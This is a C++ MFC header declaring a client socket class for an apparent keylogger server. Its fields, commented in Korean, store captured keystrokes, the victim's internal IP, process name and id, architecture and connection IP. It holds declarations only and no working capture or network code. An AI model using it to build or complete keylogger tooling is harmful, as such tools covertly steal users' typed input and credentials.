#pragma once
#include <afxsock.h>
#include <vector>

class CKeyLoggerServerDlg;

class CClientSocket :
	public CSocket
{
public:
	CKeyLoggerServerDlg* m_main;
	std::vector<WCHAR> m_MSGList; // 입력한 글자 리스트
	CString internal_IP; // 내부망 IP
	WCHAR m_processName[40]; // 프로세스 이름
	DWORD m_pid; // 프로세스 id
	BYTE m_arch; // 아키텍쳐 (0x32 또는 0x64)
	BOOL m_status; // 프로세스가 살아있는가?
	CString IP; // 접속 IP

	CClientSocket(CKeyLoggerServerDlg*);
	virtual void OnReceive(int nErrorCode);
	virtual void OnClose(int nErrorCode);
};

